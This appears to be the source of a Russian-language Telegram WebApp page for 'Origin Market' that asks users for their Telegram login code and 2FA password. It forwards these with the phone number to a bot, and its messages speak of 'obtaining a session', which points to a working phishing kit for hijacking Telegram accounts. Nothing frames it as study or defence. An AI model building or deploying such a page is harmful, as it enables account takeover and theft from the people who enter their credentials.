<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Введите код подтверждения - Origin Market</title>
    <link rel="stylesheet" href="styles-v2.css?v=4">
    <style>
        /* Стили для страницы ввода кода */
        .verification-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            min-height: 100vh;
            justify-content: center;
        }

        .verification-title {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 10px;
        }

        .verification-description {
            font-size: 1rem;
            color: #cccccc;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .code-input-container {
            width: 100%;
            margin-bottom: 20px;
        }

        .code-input {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.1rem;
            border: 2px solid #00F0F9;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            text-align: center;
            letter-spacing: 2px;
            font-weight: bold;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .code-input:focus {
            outline: none;
            border-color: #00F0F9;
            box-shadow: 0 0 20px rgba(0, 240, 249, 0.5);
            background: rgba(255, 255, 255, 0.15);
        }

        .code-input::placeholder {
            color: #888888;
            letter-spacing: normal;
        }

        .button-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .confirm-button {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.1rem;
            font-weight: bold;
            background: linear-gradient(135deg, #00F0F9, #0088cc);
            color: #1A1C2F;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 240, 249, 0.3);
        }

        .confirm-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 240, 249, 0.4);
        }

        .resend-button {
            width: 100%;
            padding: 12px 20px;
            font-size: 1rem;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .resend-button:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: none;
            padding: 10px 15px;
            border-radius: 8px;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .back-button:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .error-message {
            color: #ff6b6b;
            font-size: 0.9rem;
            margin-top: 10px;
            display: none;
        }

        .success-message {
            color: #51cf66;
            font-size: 0.9rem;
            margin-top: 10px;
            display: none;
        }

        /* Анимации */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .verification-container > * {
            animation: fadeIn 0.6s ease-out;
        }

        .verification-container > *:nth-child(2) { animation-delay: 0.1s; }
        .verification-container > *:nth-child(3) { animation-delay: 0.2s; }
        .verification-container > *:nth-child(4) { animation-delay: 0.3s; }
        .verification-container > *:nth-child(5) { animation-delay: 0.4s; }
    </style>
</head>
<body>
    <div class="verification-container">
        <!-- Кнопка назад -->
        <button class="back-button" onclick="goBack()">← Назад</button>
        
        <!-- Заголовок -->
        <h1 class="verification-title">Введите код подтверждения</h1>
        
        <!-- Описание -->
        <p class="verification-description">Мы отправили код на ваш номер телефона</p>
        
        <!-- Поле для 2FA (скрыто по умолчанию) -->
        <div class="password-container" id="passwordContainer" style="display: none; width: 100%; margin-bottom: 20px;">
            <input 
                type="password" 
                class="code-input" 
                id="passwordInput" 
                placeholder="Введите пароль от 2FA" 
                autocomplete="off"
            >
        </div>
        
        <!-- Поле ввода кода -->
        <div class="code-input-container">
            <input 
                type="text" 
                class="code-input" 
                id="codeInput" 
                placeholder="Введите код" 
                maxlength="5"
                autocomplete="off"
            >
        </div>
        
        <!-- Кнопки -->
        <div class="button-container">
            <button class="confirm-button" onclick="verifyCode()">
                Подтвердить
            </button>
            
            <button class="resend-button" onclick="resendCode()">
                Отправить код повторно
            </button>
        </div>
        
        <!-- Сообщения об ошибках/успехе -->
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
    </div>

    <script>
        // Получаем номер телефона из localStorage
        const phoneNumber = localStorage.getItem('phoneNumber');
        
        // Функция возврата назад
        function goBack() {
            window.history.back();
        }
        
        // Функция проверки кода
        async function verifyCode() {
            const code = document.getElementById('codeInput').value;
            const password = document.getElementById('passwordInput').value;
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            // Скрываем предыдущие сообщения
            errorDiv.style.display = 'none';
            successDiv.style.display = 'none';
            
            if (!code || code.length !== 5) {
                showError('Пожалуйста, введите 5-значный код');
                return;
            }
            
            try {
                // Показываем загрузку
                const confirmBtn = document.querySelector('.confirm-button');
                const originalText = confirmBtn.textContent;
                confirmBtn.textContent = 'Проверяем...';
                confirmBtn.disabled = true;
                
                // Отправляем код боту через Telegram WebApp
                if (window.Telegram && window.Telegram.WebApp) {
                    // Отправляем данные боту
                    const data = {
                        phone: phoneNumber,
                        code: code,
                        password: password || null
                    };
                    
                    // Отправляем через Telegram WebApp
                    window.Telegram.WebApp.sendData(JSON.stringify(data));
                    
                    // Ждем ответ от бота
                    window.Telegram.WebApp.onEvent('main_button_clicked', handleBotResponse);
                    
                } else {
                    // Fallback для тестирования вне Telegram
                    showSuccess('Код отправлен боту для проверки...');
                    setTimeout(() => {
                        // Симуляция ответа от бота
                        const responses = ['success', 'invalid_code', 'need_2fa'];
                        const response = responses[Math.floor(Math.random() * responses.length)];
                        handleBotResponse(response);
                    }, 2000);
                }
                
            } catch (error) {
                console.error('Ошибка:', error);
                showError('Ошибка соединения. Попробуйте снова.');
            } finally {
                // Восстанавливаем кнопку
                const confirmBtn = document.querySelector('.confirm-button');
                confirmBtn.textContent = 'Подтвердить';
                confirmBtn.disabled = false;
            }
        }
        
        // Обработка ответа от бота
        function handleBotResponse(response) {
            if (typeof response === 'string') {
                response = JSON.parse(response);
            }
            
            switch (response.status) {
                case 'success':
                    showSuccess('✅ Код подтвержден! Получаем сессию...');
                    setTimeout(() => {
                        window.location.href = 'dashboard.html';
                    }, 2000);
                    break;
                    
                case 'invalid_code':
                    showError('❌ Вы ввели неверный код, повторите попытку');
                    break;
                    
                case 'need_2fa':
                    showPasswordField();
                    showSuccess('🔐 Выполните 2FA - Вам нужно ввести пароль от активного Telegram аккаунта');
                    break;
                    
                case 'invalid_password':
                    showError('❌ Неверный пароль 2FA, попробуйте снова');
                    break;
                    
                default:
                    showError('❌ Произошла ошибка, попробуйте снова');
            }
        }
        
        // Показать поле для 2FA
        function showPasswordField() {
            const passwordContainer = document.getElementById('passwordContainer');
            passwordContainer.style.display = 'block';
            document.getElementById('passwordInput').focus();
        }
        
        // Функция повторной отправки кода
        async function resendCode() {
            const resendBtn = document.querySelector('.resend-button');
            const originalText = resendBtn.textContent;
            
            try {
                resendBtn.textContent = 'Отправляем...';
                resendBtn.disabled = true;
                
                const response = await fetch('/api/resend-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phoneNumber
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showSuccess('Код отправлен повторно!');
                } else {
                    showError(result.message || 'Ошибка отправки кода');
                }
                
            } catch (error) {
                console.error('Ошибка:', error);
                showError('Ошибка соединения. Попробуйте снова.');
            } finally {
                resendBtn.textContent = originalText;
                resendBtn.disabled = false;
            }
        }
        
        // Функция показа ошибки
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            successDiv.style.display = 'none';
        }
        
        // Функция показа успеха
        function showSuccess(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            successDiv.textContent = message;
            successDiv.style.display = 'block';
            errorDiv.style.display = 'none';
        }
        
        // Автофокус на поле ввода
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('codeInput').focus();
        });
        
        // Обработка Enter
        document.getElementById('codeInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyCode();
            }
        });
        
        // Ограничение ввода только цифрами
        document.getElementById('codeInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
